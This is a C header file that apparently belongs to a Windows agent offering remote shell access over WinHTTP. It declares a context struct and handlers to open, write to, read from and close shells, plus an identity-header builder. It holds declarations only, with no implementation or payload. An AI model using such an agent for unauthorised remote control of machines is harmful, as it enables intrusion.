#pragma once

#include "types.h"
#include "transport.h"
#include "protocol.h"
#include "wire.h"
#include "memory.h"
#include "logger.h"
#include "shell.h"

#define IDENTITY_HEADERS_SIZE  900

typedef struct {
    shell_slot *shells;
    INT32 verbose;
    const WINHTTP_API *winhttp;
} agent_ctx;

DWORD Handle_ShellOpen(const agent_ctx *ctx, UINT32 corr_id, unsigned char *reply, DWORD *reply_len);
DWORD Handle_ShellWrite(const agent_ctx *ctx, const incoming_message *msg, UINT32 corr_id, unsigned char *reply, DWORD *reply_len);
DWORD Handle_ShellRead(const agent_ctx *ctx, const incoming_message *msg, UINT32 corr_id, unsigned char *reply, DWORD *reply_len);
DWORD Handle_ShellClose(const agent_ctx *ctx, const incoming_message *msg, UINT32 corr_id, unsigned char *reply, DWORD *reply_len);
USIZE Handle_IdentityHeaders(CHAR headers[IDENTITY_HEADERS_SIZE]);
